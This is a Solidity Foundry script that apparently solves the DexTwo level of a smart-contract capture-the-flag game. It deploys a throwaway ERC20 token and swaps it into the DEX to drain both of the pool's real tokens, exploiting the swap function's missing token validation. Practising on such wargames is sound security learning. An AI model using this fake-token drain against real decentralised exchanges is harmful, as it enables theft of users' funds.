// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import{Script,console} from "forge-std/Script.sol";
import{DexTwo} from "../src/Level23.sol";
import {ERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract MyToken is ERC20{
        constructor(uint256 initialSupply) ERC20("MyToken","MT"){
            console.log("msg.sender is ",msg.sender);
            _mint(msg.sender,initialSupply);
            console.log("token balance of msg.sender",balanceOf(msg.sender));
        }
}
contract Level23Solution is Script{
    DexTwo instance=DexTwo(0x9516F97A0AA1c1c1D75D2116382808E77B1BEFd2);
    
    function run() external{
        
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address deployer=vm.addr(vm.envUint("PRIVATE_KEY"));  // my address
console.log("Deployer address:", deployer);
        instance.approve(address(instance),500);  //approving tokens
        address token1=instance.token1();
        address token2=instance.token2();
        console.log("token1 balance",instance.balanceOf(token1, address(instance)));
        console.log("token2 balance",instance.balanceOf(token2, address(instance)));
        MyToken token=new MyToken(400);
        console.log("msg sender",deployer);
        console.log("msg.sender token balance",token.balanceOf(deployer));
        token.approve(address(instance), 400);  //approving my 400 tokens
        token.transfer(address(instance),100); //transferring 100 tokens to the dex2 contract
        console.log("instance token balance",token.balanceOf(address(instance)));
        instance.swap(address(token),token1, 100);
        instance.swap(address(token), token2, 200);
        vm.stopBroadcast();
        console.log("token1 balance",instance.balanceOf(token1, address(instance)));
        console.log("token2 balance",instance.balanceOf(token2, address(instance)));
    }
}